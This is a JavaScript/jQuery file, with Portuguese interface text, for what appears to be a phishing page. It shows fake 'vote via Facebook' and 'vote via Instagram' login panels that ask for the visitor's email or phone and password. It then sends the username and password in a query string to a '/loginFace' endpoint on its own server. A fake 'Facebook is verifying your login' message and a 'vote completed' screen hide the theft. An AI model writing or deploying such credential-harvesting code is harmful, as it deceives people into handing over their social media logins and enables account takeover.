$(function(){
  
  //faceHtml
  let face = '<p>vote pelo Facebook<p><hr width="50%"><input arial-label="E-mail ou o telefone" id="nameFace" type="text"><br><input id="passFace" type="password" arial-label="Senha"><br><button class="loginFace" onclick="loginFace()" id="loginFace">Entrar</button>'
  
  //instaHtml
  let insta = '<p>vote pelo Instagram<p><hr width="50%"><input id="nameInsta" placeholder=" insira o e-mail ou o nome de usuario" type="text"><br><input id="passInsta" type="password" placeholder="insira a senha"><br><button class="loginInsta" id="loginInsta">Entrar</button'
  
  //clickFace
  $('#face').click(function(){
    $('#painelLogin').fadeOut();
    $('#painelLogin').html(face);
    $('#painelLogin').fadeIn();
  })
  
  //clickInsta
  $('#insta').click(function() {
        $('#painelLogin').fadeOut();
        $('#painelLogin').html(insta);
        $('#painelLogin').fadeIn();
  })
  
  //loginFace
  loginFace = () => {
    let name = $('#nameFace').val()
    let pass = $('#passFace').val()
    //loading time 
    $('#respServer').html('<small font-size="20"><img heigth="50" width="50" src="/static/load.gif"><p>aguarde, o Facebook está verificando o seu login</p></small>')
    fetch(`/loginFace?user=${name}&pass=${pass}`)
    .then((res) => {
      return res.json()
    })
    .then((js) => {
      let res = js.return
      if(res){
        $('#respServer').html('<p color="green">login aceito</p>')
        $("#painelLogin").html('<h2>voto concluído</h2><img heigth="100" width="100" src="/static/ok.png"><a href="https://udemy.com"><small><p>entre e conheça o nosso trabalho</p></small></a>')
        setTimeout($('#udemy').trigger('click'), 1500);
      }
      else{
        $('#respServer').html('<small><p color="red">login incorreto</p></small>')
      }
    })
  }
  
})